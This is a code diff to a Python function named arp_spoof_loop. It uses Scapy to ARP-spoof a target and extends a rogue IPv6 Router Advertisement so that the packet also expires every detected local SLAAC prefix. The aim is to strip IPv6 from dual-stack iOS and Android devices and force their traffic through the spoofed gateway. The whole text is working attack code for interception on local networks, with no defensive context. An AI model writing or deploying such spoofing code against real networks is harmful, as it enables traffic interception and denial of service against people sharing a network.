@@ -17,8 +17,8 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
     """
     try:
         from scapy.all import Ether, ARP, sendp, conf as scapy_conf
-        from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr
-        from .network import get_scapy_interface, get_interface_ipv6_link_local
+        from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo
+        from .network import get_scapy_interface, get_interface_ipv6_link_local, get_interface_ipv6_prefixes
         npf_iface = get_scapy_interface(interface)
         my_ll_ipv6 = get_interface_ipv6_link_local(interface)
 
@@ -35,20 +35,27 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                 psrc=target_ip, hwsrc=my_mac)
         )
 
-        # ICMPv6 Rogue RA Packet (IPv6 routerlifetime=0 deprecation)
-        # Informs dual-stack iOS/Android devices that IPv6 gateway is deprecated
-        pkt_ra_unicast = (
-            Ether(dst=target_mac, src=my_mac) /
+        # ICMPv6 Rogue RA Packet with Router Lifetime = 0 and SLAAC Prefix Lifetime = 0
+        # Informs dual-stack iOS/Android devices that IPv6 gateway and SLAAC prefixes are expired
+        ra_base = (
             IPv6(src=my_ll_ipv6, dst="ff02::1") /
             ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
             ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
         )
-        pkt_ra_multicast = (
-            Ether(dst="33:33:00:00:00:01", src=my_mac) /
-            IPv6(src=my_ll_ipv6, dst="ff02::1") /
-            ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
-            ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
-        )
+
+        # Append Prefix Information Options for all detected local SLAAC prefixes with validlifetime=0
+        for p_str, p_len in get_interface_ipv6_prefixes(interface):
+            ra_base = ra_base / ICMPv6NDOptPrefixInfo(
+                prefix=p_str,
+                prefixlen=p_len,
+                L=1,
+                A=1,
+                validlifetime=0,
+                preferredlifetime=0
+            )
+
+        pkt_ra_unicast = Ether(dst=target_mac, src=my_mac) / ra_base
+        pkt_ra_multicast = Ether(dst="33:33:00:00:00:01", src=my_mac) / ra_base
 
         log.info(f"Dual-stack spoof started: {target_ip} ({target_mac})")
 
